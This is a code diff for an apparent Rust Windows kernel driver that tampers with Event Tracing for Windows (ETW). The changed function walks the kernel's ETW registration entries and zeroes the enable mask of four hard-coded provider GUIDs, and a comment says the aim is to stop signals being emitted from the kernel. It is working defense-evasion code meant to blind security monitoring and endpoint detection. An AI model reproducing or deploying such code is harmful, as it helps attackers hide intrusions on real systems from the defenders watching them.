@@ -15,6 +15,8 @@ use wdk_sys::{
     ntddk::{MmGetSystemRoutineAddress, RtlInitUnicodeString},
 };
 
+static mut HAS_CHANGED: bool = false;
+
 /// Patches the ETW Kernel table in memory preventing signals being emitted full stop from the kernel!
 pub fn patch_etw_kernel_table() {
     let table = match get_etw_dispatch_table() {
@@ -514,12 +516,24 @@ unsafe fn edit_reg_entry_mask(
         // null pointers. Furthermore, from reversing the function EtwEventEnabled which is also referenced in the blog regarding
         // Lazarus, if the mask == 0, then the relevant arm of the function is not taken, so there is no point recording it.
         if (*(current_reg_entry)).mask_dword == 0 {
-            return Err(());
+            current_reg_entry = (*current_reg_entry).reg_list.flink as *const _;
+           continue;
         }
 
-        if *guid_string.to_ascii_lowercase() == "F25BCD2E-2690-55DC-3BC4-07B65B1B41C9".to_string().to_ascii_lowercase() {
+        // println!("[ferric-fox] [i] {}, {:b}", guid_string, (*(current_reg_entry as *mut EtwRegEntry)).mask_dword);
+
+        if unsafe { HAS_CHANGED } {
+            return Ok(());
+        }
+
+        if *guid_string.to_ascii_lowercase() == "FF8C24C8-E784-FFFF-0000-000000000000".to_string().to_ascii_lowercase() ||
+            *guid_string.to_ascii_lowercase() == "0770CE91-42FA-4092-A42B-4074430FA74E".to_string().to_ascii_lowercase() || 
+            *guid_string.to_ascii_lowercase() == "7A881C79-AD79-5187-3C97-24E57DB0B998".to_string().to_ascii_lowercase() || 
+            *guid_string.to_ascii_lowercase() == "D199CE5C-7548-4D05-AD81-EF5287A93328".to_string().to_ascii_lowercase() {
+
             unsafe { (*(current_reg_entry as *mut EtwRegEntry)).mask_dword = 0 };
-            println!("[ferric-fox] Modified F25BCD2E-2690-55DC-3BC4-07B65B1B41C9 mask to 0. _ETW_REG_ENTRY address: {:p}", current_reg_entry);
+            println!("[ferric-fox] Modified {guid_string} mask to 0. _ETW_REG_ENTRY address: {:p}", current_reg_entry);
+            unsafe { HAS_CHANGED = true };
         }
 
         // Walk to the next _ETW_REG_ENTRY item
